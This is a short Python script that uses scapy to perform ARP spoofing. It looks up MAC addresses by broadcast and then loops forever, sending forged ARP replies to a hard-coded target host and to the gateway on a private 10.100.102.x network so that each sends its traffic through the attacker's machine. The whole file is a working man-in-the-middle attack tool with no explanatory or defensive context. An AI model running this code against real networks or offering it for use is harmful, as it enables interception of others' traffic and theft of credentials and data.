import scapy.all as scapy 
import time 


target_ip =  "10.100.102.24"
gateway_ip = "10.100.102.1"
#my_pc_ip = "10.100.102.11"

def get_mac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcastP = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpReqBroad = broadcastP/arpRequest
    answer, unansw = scapy.srp(arpReqBroad, timeout = 1, verbose=0)
    if answer:
        return answer[0][1].src
    return None


#print(get_mac(target_ip))
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = spoof_ip, hwdst= target_mac))



while True:
    spoof(target_ip, gateway_ip)
    spoof(gateway_ip, target_ip)
    time.sleep(1)

